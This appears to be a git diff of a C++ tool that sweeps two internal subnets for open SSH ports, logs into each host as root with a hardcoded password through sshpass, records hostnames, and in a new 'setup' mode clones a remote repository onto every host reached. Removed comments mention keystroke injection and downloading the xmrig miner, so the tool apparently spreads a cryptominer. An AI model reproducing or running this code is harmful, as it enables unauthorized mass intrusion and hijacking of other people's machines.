@@ -2,29 +2,39 @@
 #include <iostream>
 #include <string>
 #include <unistd.h>
-//#include <X11/keysym.h>
-//#include <X11/extensions/XTest.h>
 #include <memory>
 #include <fstream>
 #include <vector>
 #include <array>
-/*
-void emulate_keyboard(std::string inp){
-	Display *display;
-	display = XOpenDisplay(NULL);
-	unsigned int keycode;
-	for(char c : inp){
-	keycode = XKeysymToKeycode(display, c);
-	XTestFakeKeyEvent(display, keycode, True, 0);
-	XTestFakeKeyEvent(display, keycode, False, 0);
-	XFlush(display);
-	}
-	keycode = XKeysymToKeycode(display, XK_KP_Enter);
-	XTestFakeKeyEvent(display, keycode, True, 0);
-	XTestFakeKeyEvent(display, keycode, False, 0);
-	XFlush(display);
-	XCloseDisplay(display);
-}*/
+#include <sys/socket.h>
+#include <arpa/inet.h>
+
+bool isPortOpen(const std::string& ip, int port) {
+    int sock = socket(AF_INET, SOCK_STREAM, 0);
+    if (sock < 0) {
+        std::cerr << "fail to create socket" << std::endl;
+        return false;
+    }
+
+    struct sockaddr_in server;
+    server.sin_family = AF_INET;
+    server.sin_port = htons(port);
+    inet_pton(AF_INET, ip.c_str(), &server.sin_addr);
+
+    struct timeval timeout;
+    timeout.tv_sec = 1;  
+    timeout.tv_usec = 0;
+    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (const char*)&timeout, sizeof(timeout));
+
+    // try
+    if (connect(sock, (struct sockaddr*)&server, sizeof(server)) < 0) {
+        close(sock);
+        return false;  // port closed
+    }
+
+    close(sock);
+    return true;  // port opened
+}
 
 std::string exec(const char* cmd) {
     std::array<char, 128> buffer;
@@ -39,26 +49,6 @@ std::string exec(const char* cmd) {
     }
 
     return result;
-}
-/*
-bool check_connection(std::string inp){
-	std::string word = "";
-	for(int i = 0; i < inp.size(); ++i){
-		if(inp[i] == ' '){
-			if(word == "password" || word == "Password"){ //idk password or Password (edit this if u know)
-				return 1;
-			}
-			word = "";
-		}
-		else{
-			word += inp[i];
-		}
-	}
-	return 0;
-}*/
-
-void setup(){
-	//ur func to setup worker and download xmrig
 }
 
 std::vector<std::string> split(std::string str){
@@ -102,20 +92,24 @@ int main(int argc, char* argv[]){
 		std::cout << "use scan or connect [ip]\n ";
 		return 1;
 	}
-	
 	std::string arg = argv[1];
-  	// "sshpass -p 1347QwAsZx ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2  root@172.17.213.120 'hostname' "
 	if(arg == "scan"){
+		std::string currect_host = "";
 		for(int i = 2; i < 256; ++i){
 			//checking for 112
-			ip = "sshpass -p 1347QwAsZx ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2  root@172.17.212." + std::to_string(i) + "hostname"; //ip
-			hosts.push_back(system(ip.c_str()) + " " + std::to_string(i)); //to ip data base
-			setup(); // ur func
-			
+			if(isPortOpen("172.17.212."+std::to_string(i), 22)){
+				ip = "sshpass -p 1347QwAsZx ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2  root@172.17.212." + std::to_string(i) + " hostname"; //ip
+				currect_host = exec(ip.c_str()) + " " + std::to_string(i);
+				hosts.push_back(currect_host); //to ip data base (edit to system if it does not working)
+				std::cout << currect_host << std::endl;
+			}
 			//checking for 113
-			ip = "sshpass -p 1347QwAsZx ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2  root@172.17.213." + std::to_string(i) + "hostname"; //ip
-			hosts.push_back(system(ip.c_str()) + " " + std::to_string(i)); //to ip data base
-			setup(); // ur func
+			if(isPortOpen("172.17.213."+std::to_string(i), 22)){
+				ip = "sshpass -p 1347QwAsZx ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2  root@172.17.213." + std::to_string(i) + " hostname"; //ip
+				currect_host = exec(ip.c_str()) + " " + std::to_string(i);
+				hosts.push_back(currect_host); //to ip data base (edit to system if it does not working)
+				std::cout << currect_host << std::endl;
+			}
 		}
 
 		std::ofstream out("hosts.txt", std::ios::out); //open file to rewrite all data
@@ -124,6 +118,22 @@ int main(int argc, char* argv[]){
 		}
 		out.close(); // close file
 	}	
+
+	else if(arg == "setup"){
+		for(int i = 2; i < 256; ++i){
+			//112
+			if(isPortOpen("172.17.212."+std::to_string(i), 22)){
+				ip = "sshpass -p 1347QwAsZx ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2  root@172.17.212." + std::to_string(i) + " git clone https://github.com/Andrew-24coop/EchoBreak.git"; //ip
+				system(ip.c_str());
+			}
+			//113
+			if(isPortOpen("172.17.213."+std::to_string(i), 22)){
+				ip = "sshpass -p 1347QwAsZx ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2  root@172.17.213." + std::to_string(i) + " git clone https://github.com/Andrew-24coop/EchoBreak.git"; //ip
+				system(ip.c_str());
+			}
+		}
+	}
+
 	else if(arg == "connect"){
 		std::string host = argv[1];
 		connect(host);
